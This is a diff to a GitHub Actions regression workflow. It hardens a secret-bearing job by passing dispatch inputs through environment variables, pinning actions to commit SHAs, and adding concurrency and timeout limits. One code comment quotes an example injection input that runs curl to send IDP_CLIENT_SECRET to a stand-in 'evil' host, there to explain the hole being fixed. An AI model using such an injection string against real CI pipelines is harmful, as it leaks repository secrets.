@@ -112,6 +112,17 @@ on:
 permissions:
   contents: read
 
+# L10 fix -- two dispatches (or a dispatch racing a future scheduled fire)
+# must not run against the same live org/action/version/dataset at once;
+# that's the exact overlap `scripts/run_eval_scheduled.sh`'s `lockf` guard
+# exists to prevent on the local path, and this workflow had no equivalent.
+# `cancel-in-progress: false`: queue the second run rather than kill the
+# first mid-flight against a live org (a cancelled mid-run IDP submission
+# is worse than a short wait).
+concurrency:
+  group: regression-run
+  cancel-in-progress: false
+
 env:
   PYTHONDONTWRITEBYTECODE: "1"
   # Scheduled-run defaults (see "Where the run parameters live" above).
@@ -129,28 +140,65 @@ jobs:
   regression:
     name: run_eval (headless regression)
     runs-on: ubuntu-latest
+    # L10 fix: this is the only credential-bearing workflow in the repo
+    # and had no ceiling -- a hung IDP poll or a wedged step could run
+    # (and hold the `concurrency:` group above) indefinitely otherwise.
+    timeout-minutes: 30
     # No `continue-on-error`: a non-zero `run_eval` exit fails this job.
     # See "What a red run means" below for what that failure does (and
     # does not) tell a reader.
     steps:
-      - uses: actions/checkout@v4
+      # M6 fix: this is the only credential-bearing workflow in the repo
+      # (holds IDP_CLIENT_SECRET + LANGFUSE_SECRET_KEY below) -- pinned to
+      # commit SHA, not a mutable tag, matching the standard CLAUDE.md
+      # ## External services already applies to the six Langfuse images
+      # (tag + manifest digest). Human-readable tag kept as a comment.
+      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
 
       - name: Install uv
-        uses: astral-sh/setup-uv@v3
+        uses: astral-sh/setup-uv@caf0cab7a618c569241d31dcd442f54681755d39 # v3.2.4 (resolves "v3")
 
       - name: install from the lock file only (no re-resolution)
         run: uv sync --locked --all-extras --dev
 
+      # H2 fix (resilience review, 2026-09-23): every value below that can
+      # originate from a workflow_dispatch caller (`inputs.*`) is passed
+      # through `env:`, never interpolated directly into the `run:`
+      # script via `${{ }}`. `${{ }}` expansion happens BEFORE bash ever
+      # sees the line -- it splices raw text into the shell source, so an
+      # input like `x"; curl -d "$IDP_CLIENT_SECRET" https://evil…; #`
+      # would execute in the secret-bearing job below. Passing via `env:`
+      # makes the value an opaque environment-variable string that bash
+      # only ever reads with `"$VAR"`, never parses as source. Because
+      # GitHub only lets principals with write access to THIS repo
+      # dispatch a workflow, but a fine-grained PAT can hold
+      # `Actions: write` without `Contents: write` (dispatch rights
+      # without edit rights), this is privilege escalation to every repo
+      # secret if left unfixed, not a theoretical concern.
+      #
+      # `$GITHUB_OUTPUT` is written with the heredoc/delimiter form (a
+      # random per-run delimiter), not bare `key=value` lines -- a
+      # newline in an input would otherwise inject arbitrary extra
+      # `key=value` output lines.
       - name: Resolve run parameters
         id: params
+        env:
+          EVENT_NAME: ${{ github.event_name }}
+          IN_ORG: ${{ inputs.org }}
+          IN_ACTION: ${{ inputs.action }}
+          IN_VERSION: ${{ inputs.version }}
+          IN_DATASET: ${{ inputs.dataset }}
+          IN_RUN_NAME: ${{ inputs.run_name }}
+          IN_MAX_DOCS: ${{ inputs.max_documents_per_run }}
+          RUN_ID: ${{ github.run_id }}
         run: |
-          if [ "${{ github.event_name }}" = "workflow_dispatch" ]; then
-            ORG="${{ inputs.org }}"
-            ACTION="${{ inputs.action }}"
-            VERSION="${{ inputs.version }}"
-            DATASET="${{ inputs.dataset }}"
-            RUN_NAME="${{ inputs.run_name }}"
-            MAX_DOCS="${{ inputs.max_documents_per_run }}"
+          if [ "${EVENT_NAME}" = "workflow_dispatch" ]; then
+            ORG="${IN_ORG}"
+            ACTION="${IN_ACTION}"
+            VERSION="${IN_VERSION}"
+            DATASET="${IN_DATASET}"
+            RUN_NAME="${IN_RUN_NAME}"
+            MAX_DOCS="${IN_MAX_DOCS}"
           else
             ORG="${SCHEDULED_ORG}"
             ACTION="${SCHEDULED_ACTION}"
@@ -161,16 +209,29 @@ jobs:
           fi
 
           if [ -z "${RUN_NAME}" ]; then
-            RUN_NAME="ci-${{ github.event_name }}-$(date -u +%Y%m%dT%H%M%SZ)-${GITHUB_RUN_ID}"
+            RUN_NAME="ci-${EVENT_NAME}-$(date -u +%Y%m%dT%H%M%SZ)-${RUN_ID}"
           fi
 
+          delim="ghadelim_$(date -u +%s%N)_${RANDOM}"
           {
-            echo "org=${ORG}"
-            echo "action=${ACTION}"
-            echo "version=${VERSION}"
-            echo "dataset=${DATASET}"
-            echo "run_name=${RUN_NAME}"
-            echo "max_docs=${MAX_DOCS}"
+            echo "org<<${delim}"
+            echo "${ORG}"
+            echo "${delim}"
+            echo "action<<${delim}"
+            echo "${ACTION}"
+            echo "${delim}"
+            echo "version<<${delim}"
+            echo "${VERSION}"
+            echo "${delim}"
+            echo "dataset<<${delim}"
+            echo "${DATASET}"
+            echo "${delim}"
+            echo "run_name<<${delim}"
+            echo "${RUN_NAME}"
+            echo "${delim}"
+            echo "max_docs<<${delim}"
+            echo "${MAX_DOCS}"
+            echo "${delim}"
           } >> "$GITHUB_OUTPUT"
 
       - name: run_eval
@@ -204,18 +265,29 @@ jobs:
           LANGFUSE_HOST: ${{ secrets.LANGFUSE_HOST }}
           LANGFUSE_SECRET_KEY: ${{ secrets.LANGFUSE_SECRET_KEY }}
           LANGFUSE_PUBLIC_KEY: ${{ secrets.LANGFUSE_PUBLIC_KEY }}
+          # H2 fix, continued: this step's `env:` block already holds
+          # IDP_CLIENT_SECRET/LANGFUSE_SECRET_KEY above -- the exact job
+          # the finding describes as highest-stakes for injection. The
+          # resolved run parameters flow in the same safe way (`env:`,
+          # never `${{ steps.params.outputs.* }}` spliced into `run:`).
+          PARAM_ORG: ${{ steps.params.outputs.org }}
+          PARAM_ACTION: ${{ steps.params.outputs.action }}
+          PARAM_VERSION: ${{ steps.params.outputs.version }}
+          PARAM_DATASET: ${{ steps.params.outputs.dataset }}
+          PARAM_RUN_NAME: ${{ steps.params.outputs.run_name }}
+          PARAM_MAX_DOCS: ${{ steps.params.outputs.max_docs }}
         run: |
           MAX_DOCS_FLAG=()
-          if [ -n "${{ steps.params.outputs.max_docs }}" ]; then
-            MAX_DOCS_FLAG=(--max-documents-per-run "${{ steps.params.outputs.max_docs }}")
+          if [ -n "${PARAM_MAX_DOCS}" ]; then
+            MAX_DOCS_FLAG=(--max-documents-per-run "${PARAM_MAX_DOCS}")
           fi
 
           .venv/bin/python -m idp_regression.orchestration.cli \
-            --org "${{ steps.params.outputs.org }}" \
-            --action "${{ steps.params.outputs.action }}" \
-            --version "${{ steps.params.outputs.version }}" \
-            --dataset "${{ steps.params.outputs.dataset }}" \
-            --run "${{ steps.params.outputs.run_name }}" \
+            --org "${PARAM_ORG}" \
+            --action "${PARAM_ACTION}" \
+            --version "${PARAM_VERSION}" \
+            --dataset "${PARAM_DATASET}" \
+            --run "${PARAM_RUN_NAME}" \
             "${MAX_DOCS_FLAG[@]}"
 
 # ── What a red run means (CT-04) ────────────────────────────────────────
